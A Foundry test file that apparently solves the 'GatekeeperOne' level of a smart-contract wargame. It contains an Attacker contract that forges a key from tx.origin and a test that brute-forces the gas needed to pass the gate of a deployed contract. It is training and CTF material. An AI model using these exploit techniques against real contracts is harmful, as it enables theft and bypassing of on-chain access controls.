// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/L13GatekeeperOne.sol";

contract Attacker {
    function enter(address _gatekeeperOne, uint256 gas) external {
        GatekeeperOne gatekeeperOne = GatekeeperOne(_gatekeeperOne);

        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        // require(gas <= 8191, "gas >= 8191");
        require(gatekeeperOne.enter{gas: (8191 * 3) + gas}(key), "Incorrect key");
    }
}

contract GatekeeperOneTest is Test {
    GatekeeperOne gatekeeperOne;
    Attacker attacker;

    function setUp() public {
        gatekeeperOne = GatekeeperOne(0x24B3c7704709ed1491473F30393FFc93cFB0FC34);
        attacker = new Attacker();
    }

    function testGasleft() public {
        for (uint256 i = 0; i <= 8191; i++) {
            try attacker.enter(address(gatekeeperOne), i) {
                console.log("gas required", i);
                return;
            } catch {}
        }
        revert("All failed");
    }
}
